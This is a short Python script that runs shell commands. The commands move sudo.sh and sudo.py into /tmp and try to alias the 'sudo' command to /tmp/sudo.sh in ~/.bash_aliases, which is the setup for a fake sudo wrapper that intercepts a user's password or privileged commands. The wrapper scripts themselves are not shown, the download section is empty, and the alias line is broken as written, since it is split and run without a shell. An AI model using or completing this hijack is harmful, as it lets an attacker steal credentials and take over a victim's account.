import subprocess

# Download .sh files code
#
#
# --------------------------
all_commands = ["pwd","chmod +x sudo.sh","mv sudo.sh /tmp/sudo.sh","chmod +x sudo.py","mv sudo.py /tmp/sudo.py","alias sudo='/tmp/sudo.sh' >> ~/.bash_aliases"]

for i in all_commands:
    subprocess.run(i.split(" "))

